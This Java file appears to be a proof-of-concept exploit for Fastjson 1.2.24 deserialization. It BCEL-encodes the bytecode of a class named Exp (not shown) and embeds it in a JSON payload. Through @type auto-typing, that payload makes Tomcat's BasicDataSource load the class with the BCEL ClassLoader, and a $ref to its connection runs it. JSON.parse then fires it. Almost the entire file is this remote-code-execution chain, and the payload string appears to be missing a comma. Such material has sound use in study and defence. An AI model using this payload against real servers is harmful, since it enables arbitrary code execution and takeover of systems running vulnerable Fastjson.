package BCEL;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Test2 {
    public static void main(String[] args) throws IOException {
//        byte[] bytes = Files.readAllBytes(Paths.get("F:\\Fastjson1.2.24\\src\\main\\java\\BCEL\\Exp.class"));
//        File file = new File("F:\\\\Fastjson1.2.24\\\\src\\\\main\\\\java\\\\BCEL\\\\Exp.class");
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        FileInputStream fileInputStream = new FileInputStream(file);
//        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
//        byte[] bytes = new byte[1024];
//        int len=0;
//        while((len=bufferedInputStream.read(bytes,0,1024))!=-1){
//                byteArrayOutputStream.write(bytes,0,len);
//        }

        //System.out.println(Arrays.toString(cls.getBytes()));
//
//        String code = Utility.encode(bytes, true);//转换为字节码并编码为bcel字节码

        JavaClass cls = Repository.lookupClass(Exp.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
        String payload = "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+code+"\"\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}
